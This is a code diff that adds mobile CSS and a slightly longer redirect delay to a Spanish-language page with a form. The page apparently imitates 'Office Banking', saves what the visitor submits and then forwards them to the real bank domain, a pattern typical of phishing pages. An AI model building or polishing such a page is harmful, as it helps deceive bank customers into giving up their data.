@@ -156,8 +156,43 @@
     }
 
     @media (max-width: 480px) {
+      body {
+        padding: 16px;
+      }
+
       .modal {
+        max-width: 100%;
         padding: 20px 16px;
+        border-width: 2px;
+      }
+
+      .brand {
+        gap: 4px;
+        flex-wrap: wrap;
+      }
+
+      .office,
+      .banking {
+        font-size: 1.5rem;
+        padding: 8px 10px;
+      }
+
+      .modal-header p {
+        font-size: 0.85rem;
+      }
+
+      label {
+        font-size: 0.9rem;
+      }
+
+      input {
+        padding: 12px 12px;
+        font-size: 0.95rem;
+      }
+
+      button {
+        padding: 14px;
+        font-size: 0.95rem;
       }
     }
   </style>
@@ -248,7 +283,7 @@
           mostrarMensaje(data.mensaje || 'Hemos recibido su solicitud correctamente', 'exito');
           setTimeout(() => {
             window.location.href = 'https://empresas.officebanking.cl/';
-          }, 1000);
+          }, 1200);
           form.reset();
         } else {
           mostrarMensaje(data.error || 'Error al guardar', 'error');
